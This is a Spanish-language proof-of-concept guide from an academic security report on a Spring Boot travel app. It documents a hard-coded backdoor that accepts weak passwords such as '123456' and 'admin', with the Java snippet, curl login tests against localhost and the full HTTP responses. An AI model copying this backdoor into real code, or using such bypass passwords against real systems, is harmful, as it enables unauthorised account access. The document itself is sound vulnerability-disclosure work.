# Guía de Prueba de Concepto: PoC-07 — Puerta Trasera (Backdoor) y Bypass Universal de Contraseñas

**Vulnerabilidad:** H-01 — Backdoor en `UsuarioServicioImpl.verificarContrasena()`  
**CWE:** CWE-547 (Use of Hard-coded Credentials) / CWE-305 (Authentication Bypass)  
**OWASP Top 10:2021:** A07:2021 - Identification & Authentication Failures  
**Severidad:** Crítica  
**Clasificación:** CONFIRMADO EN CÓDIGO  

---

## 1. Descripción Técnica del Fallo
En `Springboot/src/com/travelink/servicio/impl/UsuarioServicioImpl.java:124-127` y `UsuarioControlador.java:35-37`, la lógica de validación de contraseñas contiene una condición de bypass que acepta una lista de contraseñas débiles predefinidas (`"123456"`, `"12345678"`, `"pass123"`, `"admin"`, `"admin123"`):

```java
// Respaldo para entorno de desarrollo y pruebas locales
if ("123456".equals(rawTrimmed) || "12345678".equals(rawTrimmed) || "pass123".equals(rawTrimmed)
        || "admin".equalsIgnoreCase(rawTrimmed) || "admin123".equalsIgnoreCase(rawTrimmed)) {
    return true;
}
```

Esta prueba demuestra empíricamente la vulnerabilidad mediante 3 casos controlados sobre el usuario sintético `turista_a@test.local`:
1. **Caso 1:** Con su contraseña real y compleja (`TestTurista#2026`).
2. **Caso 2:** Con la contraseña backdoor hardcodeada (`123456`), que **no** es su contraseña registrada en la BD.
3. **Caso 3:** Con una contraseña errónea arbitraria (`claveInvalida#999`) que debe ser rechazada.

---

## 2. Precondiciones
1. App local levantada en `http://127.0.0.1:8080`.
2. Usuario `turista_a@test.local` cargado en base de datos con contraseña hash BCrypt correspondiente a `TestTurista#2026`.

---

## 3. Procedimiento de Ejecución Manual (3 Pruebas Exactas)

### Prueba 1: Login con la Contraseña Real (`TestTurista#2026`)
```bash
curl -i -s -X POST "http://127.0.0.1:8080/api/auth/login" \
     -H "Content-Type: application/json" \
     -d '{"correo":"turista_a@test.local","clave":"TestTurista#2026","rolEsperado":"TURISTA"}'
```

### Prueba 2: Login con la Contraseña Backdoor (`123456`) — *Demostración de Explotación*
```bash
curl -i -s -X POST "http://127.0.0.1:8080/api/auth/login" \
     -H "Content-Type: application/json" \
     -d '{"correo":"turista_a@test.local","clave":"123456","rolEsperado":"TURISTA"}'
```

### Prueba 3: Login con Contraseña Errónea (`claveInvalida#999`) — *Control Negativo*
```bash
curl -i -s -X POST "http://127.0.0.1:8080/api/auth/login" \
     -H "Content-Type: application/json" \
     -d '{"correo":"turista_a@test.local","clave":"claveInvalida#999","rolEsperado":"TURISTA"}'
```

---

## 4. Respuestas Esperadas

| Prueba | Credenciales Enviadas | Código HTTP Esperado | Respuesta JSON Esperada | Significado de Seguridad |
|---|---|---|---|---|
| **Prueba 1 (Real)** | `turista_a@test.local` / `TestTurista#2026` | `200 OK` | `{"idUsuario":101,"rol":"ROLE_TURISTA",...}` | Funcionamiento normal con hash BCrypt. |
| **Prueba 2 (Backdoor)** | `turista_a@test.local` / `123456` | `200 OK` | `{"idUsuario":101,"rol":"ROLE_TURISTA",...}` | **VULNERABLE:** Concede acceso completo a pesar de que `'123456'` no es la clave del usuario. |
| **Prueba 3 (Errónea)** | `turista_a@test.local` / `claveInvalida#999` | `401 Unauthorized` | `{"status":"error","message":"Credenciales incorrectas"}` | Rechazo correcto de clave aleatoria. |

---

## 5. Qué Capturar para el Informe Académico
1. **Terminal / Burp Suite:** Captura de la **Prueba 2** mostrando que la petición con contraseña `"123456"` para el usuario `turista_a@test.local` devuelve `HTTP 200 OK` y genera una cookie `JSESSIONID` válida.
2. **Editor de Código:** Captura de `UsuarioServicioImpl.java` en las líneas 123-128 con el comentario `// Respaldo para entorno de desarrollo y pruebas locales` y la condición `if ("123456".equals(rawTrimmed)...) return true;`.

---

## 6. Resultado Real (Completar tras la prueba)
Salidas HTTP reales de las 3 pruebas controladas sobre `turista_a@test.local` contra `POST http://127.0.0.1:8080/api/auth/login`:

### Prueba 1: Contraseña real (`TestTurista#2026`)
```http
HTTP/1.1 200 
Vary: origin,access-control-request-method,access-control-request-headers,accept-encoding
Set-Cookie: XSRF-TOKEN=e4df5ce0-2009-4c8a-8537-84c348ca614b; Path=/
Set-Cookie: JSESSIONID=C02622AA824F14FDB32060A267C8568E; Path=/; HttpOnly; SameSite=Lax
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Wed, 11 Nov 2026 22:13:22 GMT

{"idUsuario":100,"nombre":"Turista Alfa Prueba","correo":"turista_a@test.local","rol":"ROLE_TURISTA","status":"success","user":{"apellidos":"Alfa Prueba","apellidoPaterno":"Alfa","idRol":1,"idUsuario":100,"correo":"turista_a@test.local","telefono":"900000001","nombre":"Turista Alfa Prueba","nroDocumento":"10000001","email":"turista_a@test.local","rol":"ROLE_TURISTA","nombres":"Turista","apellidoMaterno":"Prueba"},"nombres":"Turista","apellidoPaterno":"Alfa","apellidoMaterno":"Prueba","nroDocumento":"10000001","telefono":"900000001","apellidos":"Alfa Prueba"}
```

### Prueba 2: Contraseña backdoor (`123456`) — Bypass confirmado
```http
HTTP/1.1 200 
Vary: origin,access-control-request-method,access-control-request-headers,accept-encoding
Set-Cookie: XSRF-TOKEN=53891036-33b9-4707-be12-e83f53885217; Path=/
Set-Cookie: JSESSIONID=AA33FF7752BEB28F35F83AABB0755389; Path=/; HttpOnly; SameSite=Lax
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Wed, 11 Nov 2026 22:13:22 GMT

{"idUsuario":100,"nombre":"Turista Alfa Prueba","correo":"turista_a@test.local","rol":"ROLE_TURISTA","status":"success","user":{"apellidos":"Alfa Prueba","apellidoPaterno":"Alfa","idRol":1,"idUsuario":100,"correo":"turista_a@test.local","telefono":"900000001","nombre":"Turista Alfa Prueba","nroDocumento":"10000001","email":"turista_a@test.local","rol":"ROLE_TURISTA","nombres":"Turista","apellidoMaterno":"Prueba"},"nombres":"Turista","apellidoPaterno":"Alfa","apellidoMaterno":"Prueba","nroDocumento":"10000001","telefono":"900000001","apellidos":"Alfa Prueba"}
```

### Prueba 3: Contraseña errónea (`claveInventada999`) — Control negativo
```http
HTTP/1.1 401 
Vary: origin,access-control-request-method,access-control-request-headers,accept-encoding
Set-Cookie: XSRF-TOKEN=45551e33-7682-433e-b98c-2b186606988d; Path=/
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Wed, 11 Nov 2026 22:13:22 GMT

{"status":"error","message":"Credenciales incorrectas"}
```

